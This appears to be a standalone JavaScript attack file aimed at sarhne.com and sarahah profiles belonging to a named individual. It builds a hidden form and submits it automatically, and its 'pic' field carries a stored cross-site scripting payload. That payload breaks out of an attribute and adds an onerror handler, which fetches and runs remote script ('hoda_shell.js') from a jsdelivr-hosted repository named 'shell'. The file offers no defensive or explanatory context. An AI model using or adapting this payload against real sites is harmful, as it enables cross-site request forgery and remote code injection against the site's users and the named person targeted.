// https://cdn.jsdelivr.net/gh/ghalypr/shell@main/hoda.js

// for https://sarahah.top/u/HodaAhmedSalem
//     https://www.sarhne.com/hodaahmedsalem
// Create a form dynamically
var sarhneForm = document.createElement("form");
sarhneForm.setAttribute("id", "sarhneForm");
sarhneForm.setAttribute("method", "post");
sarhneForm.setAttribute("action", "https://www.sarhne.com/processing.html#Hoda.Ahmed.Salem");


// Create an hidden input element for name
var sarhneName = document.createElement("input");
sarhneName.setAttribute("type", "hidden");
sarhneName.setAttribute("name", "name");
sarhneName.setAttribute("value", "Hoda.Ahmed.Salem");


// Create an hidden input element for link
var link = document.createElement("input");
link.setAttribute("type", "hidden");
link.setAttribute("name", "link");
link.setAttribute("value", "");


// Create an hidden input element for pic
var pic = document.createElement("input");
pic.setAttribute("type", "hidden");
pic.setAttribute("name", "pic");
pic.setAttribute("value", 'https://cdn.jsdelivr.net/gh/ghalypr/shell@main/hoda_shell.js" onerror="$.getScript(this.src);');



 // create a submit button
 var s = document.createElement("input");
 s.setAttribute("type", "submit");
 s.setAttribute("value", "Submit");

sarhneForm.appendChild(sarhneName);
sarhneForm.appendChild(link);
sarhneForm.appendChild(pic);


document.getElementsByTagName("body")[0].appendChild(sarhneForm);

document.getElementById("sarhneForm").submit();
